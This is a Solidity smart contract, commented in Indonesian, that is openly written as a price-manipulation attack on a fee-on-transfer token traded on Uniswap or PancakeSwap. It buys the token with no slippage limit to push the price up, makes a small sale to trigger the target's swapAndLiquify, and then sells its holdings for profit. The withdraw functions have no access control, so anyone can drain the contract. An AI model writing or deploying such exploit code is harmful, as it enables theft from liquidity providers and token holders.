// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";

contract PriceManipulationAttack {
    address public targetToken; // Alamat kontrak token yang Anda berikan
    address public uniswapRouter; // Alamat router Uniswap/PancakeSwap
    address public uniswapPair; // Alamat pair token-WETH di Uniswap/PancakeSwap
    uint256 public constant SMALL_AMOUNT = 1 * 10**18; // Jumlah kecil untuk memicu swap

    constructor(address _targetToken, address _uniswapRouter, address _uniswapPair) {
        targetToken = _targetToken;
        uniswapRouter = _uniswapRouter;
        uniswapPair = _uniswapPair;
    }

    // Fungsi untuk memulai serangan
    function attack(uint256 thresholdAmount, uint256 manipulateAmount) external payable {
        // Langkah 1: Pastikan penyerang memiliki cukup token
        uint256 attackerBalance = IERC20(targetToken).balanceOf(address(this));
        require(attackerBalance >= thresholdAmount, "Not enough tokens to attack");

        // Langkah 2: Manipulasi harga di pool dengan membeli token menggunakan BNB
        manipulatePriceUp(manipulateAmount);

        // Langkah 3: Kirim transaksi kecil untuk memicu swapAndLiquify di kontrak target
        triggerSwapInTarget();

        // Langkah 4: Kembalikan harga ke normal dan ambil keuntungan
        unwindManipulation(attackerBalance);
    }

    // Membeli token untuk menaikkan harga di pool
    function manipulatePriceUp(uint256 amount) internal {
        address[] memory path = new address[](2);
        path[0] = IUniswapV2Router02(uniswapRouter).WETH();
        path[1] = targetToken;

        IUniswapV2Router02(uniswapRouter).swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
            0, // Tidak peduli jumlah minimum token yang diterima
            path,
            address(this),
            block.timestamp
        );
    }

    // Mengirim transaksi kecil untuk memicu swapAndLiquify
    function triggerSwapInTarget() internal {
        IERC20(targetToken).approve(uniswapRouter, SMALL_AMOUNT);
        address[] memory path = new address[](2);
        path[0] = targetToken;
        path[1] = IUniswapV2Router02(uniswapRouter).WETH();

        // Jual token kecil untuk memicu threshold di kontrak target
        IUniswapV2Router02(uniswapRouter).swapExactTokensForETHSupportingFeeOnTransferTokens(
            SMALL_AMOUNT,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    // Menjual token untuk mengembalikan harga dan mengambil keuntungan
    function unwindManipulation(uint256 amount) internal {
        uint256 tokenBalance = IERC20(targetToken).balanceOf(address(this));
        require(tokenBalance >= amount, "Not enough tokens to unwind");

        IERC20(targetToken).approve(uniswapRouter, amount);
        address[] memory path = new address[](2);
        path[0] = targetToken;
        path[1] = IUniswapV2Router02(uniswapRouter).WETH();

        IUniswapV2Router02(uniswapRouter).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    // Fungsi untuk menerima ETH dari swap
    receive() external payable {}

    // Fungsi untuk menarik BNB ke penyerang
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    // Fungsi untuk menarik token yang tersisa (opsional)
    function withdrawTokens() external {
        uint256 tokenBalance = IERC20(targetToken).balanceOf(address(this));
        IERC20(targetToken).transfer(msg.sender, tokenBalance);
    }
}
